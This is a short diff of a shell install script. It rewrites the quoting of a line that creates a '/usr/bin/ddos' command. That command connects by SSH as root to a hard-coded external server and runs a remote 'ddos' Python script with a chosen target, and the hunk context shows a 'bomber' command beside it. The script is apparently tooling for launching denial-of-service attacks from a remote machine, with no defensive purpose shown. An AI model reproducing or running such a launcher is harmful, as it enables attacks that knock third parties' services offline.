@@ -19,5 +19,5 @@ sudo chmod +x /usr/bin/bomber
 
 #run ddos
 sudo touch /usr/bin/ddos
-sudo echo "ssh -t root@88.99.163.122 -p 50400 python /opt/custom/ddos/ddos'$1'.py '$2'">/usr/bin/ddos
+sudo echo 'ssh -t root@88.99.163.122 -p 50400 python /opt/custom/ddos/ddos"$1".py "$2"'>/usr/bin/ddos
 sudo chmod +x /usr/bin/ddos
